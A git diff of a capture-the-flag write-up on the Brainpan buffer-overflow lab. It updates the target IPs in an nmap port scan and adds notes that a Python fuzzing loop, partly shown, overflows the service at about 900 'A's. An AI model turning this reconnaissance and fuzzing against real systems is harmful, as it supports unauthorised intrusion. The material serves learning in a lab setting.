@@ -3,11 +3,11 @@ Following is the outcome of my hacking handiwork
 
 ## 1. Initial Scan
 
-`nmap -sV -sT -v -p- -T4 192.168.57.1/24`
+`nmap -sV -sT -v -p- -T4 192.168.56.1/24`
 
 ```
-Scanning 192.168.57.1 [65535 ports]
-Discovered open port 9999/tcp on 192.168.57.1
+Scanning 192.168.56.106 [65535 ports]
+Discovered open port 9999/tcp on 192.168.56.106
 Completed Connect Scan at 14:46, 2.04s elapsed (65535 total ports)
 Initiating Service scan at 14:46
 Scanning 1 service on 192.168.57.1
@@ -89,6 +89,10 @@ for i in range(30):
   print "[*] Sending buffer data with " + str(len(str(payload))) + " A's\r\n"
   s.close()
 ```
-Here, the Windows IP address given by DHCP is '192.168.56.105'
+Here, the Windows IP address given by DHCP is '192.168.56.105'. Use the script above and see what the program spits out.
+It turns out that the overflow occurs with circa 900 A's.
 
 ![](https://github.com/d15rup7or/Labs/blob/master/Brainpan/img/sending-A's.png)
+
+Stack addresses EAX EIP ESP
+
